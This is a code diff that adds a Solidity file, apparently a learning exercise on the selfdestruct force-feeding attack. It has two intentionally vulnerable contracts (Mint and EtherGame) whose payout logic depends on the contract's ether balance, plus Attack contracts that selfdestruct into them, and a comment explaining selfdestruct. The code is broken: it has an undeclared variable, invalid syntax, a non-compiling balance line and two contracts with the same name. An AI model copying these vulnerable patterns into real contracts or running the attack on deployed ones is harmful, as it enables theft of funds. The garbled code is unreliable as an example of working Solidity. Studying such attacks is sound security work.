@@ -1,0 +1,100 @@
+// SPDX-License-Identifier : MIT  
+ 
+pragma solidity ^0.8.17;
+
+	contract Mint{
+  address public minter;
+  uint public target = 30 ether;
+  uint public balance;
+  
+  function depositMintingEther() public payable  {
+  		require(msg.value == 1 ether, "You can only mint one NFT at a time");
+      uint bal = address(this).balance;
+      
+      require(bal <= target, "We have run out of NFTs");
+      
+      if(bal == target){
+      		lastMinter = msg.sender;
+      }
+  }
+          
+  function receiveFunds() public {
+  		require(msg.sender == lastMinter);
+          
+      (bool success, ) = msg.sender.call{value : address(this).balance}("");      
+      require(success, "Cannot send funds");
+      }
+  }
+          
+contract Attack{
+       
+   Mint badMinter;
+   constructor(Mint _badMinter) {
+   		badMinter = Mint(_badMinter);
+   }
+          
+   function attack () public payable{
+   		address payable mintAddress = payable(address(badMinter));
+   		selfdestruct (address lastMinter);
+   }
+
+   function destroy(address Anu) public {
+		require(Anu == msg.sender, "only the owner can call this");       
+    		selfdestruct(payable(Anu));
+}
+   /* Initializing a selfdestruct function is simple: you need to use the selfdestruct keyword
+    within a function and specify a payable address that can receive contract funds after the 
+    selfdestruct function is called.
+    Here is an example of a selfdestruct function typically taught in a Solidity course:
+    
+    function destroy(address apocalypse) public {
+		selfdestruct(payable(apocalypse));
+    }
+This is what the code is doing:
+The name of the function is destroy‍
+The parameter specifies the address as apocalypse‍
+When the destroy function is called, the address is specified via the apocalypse variable
+The function visibility is declared public so other contracts can access it.
+Then we use the selfdestruct keyword and pass the apocalypse variable after declaring it as payable.
+Now, since the function is public, it represents a potential security flaw. To counter this,
+ you can consider adding an onlyOwner modifier or using a require statement to confirm that 
+ only the owner can call the destroy function.
+   */
+}
+
+contract EtherGame {
+    uint public targetAmount = 5 ether;
+    address public winner;
+    uint public balance;
+
+    function play() public payable {
+        require(msg.value == 1 ether, "You can only send 1 Ether");
+
+        uint balance += msg.value;
+        require(balance <= targetAmount, "Game is over");
+
+        if (balance == targetAmount) {
+            winner = msg.sender;
+        }
+    }
+
+    function claimReward() public {
+        require(msg.sender == winner, "Not winner");
+
+        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
+        require(sent, "Failed to send Ether");
+    }
+}
+
+contract Attack {
+    EtherGame etherGame;
+
+    constructor(EtherGame _etherGame) {
+        etherGame = EtherGame(_etherGame);
+    }
+
+    function attack() public payable {
+
+        address payable addr = payable(address(etherGame));
+        selfdestruct(addr);
+    }
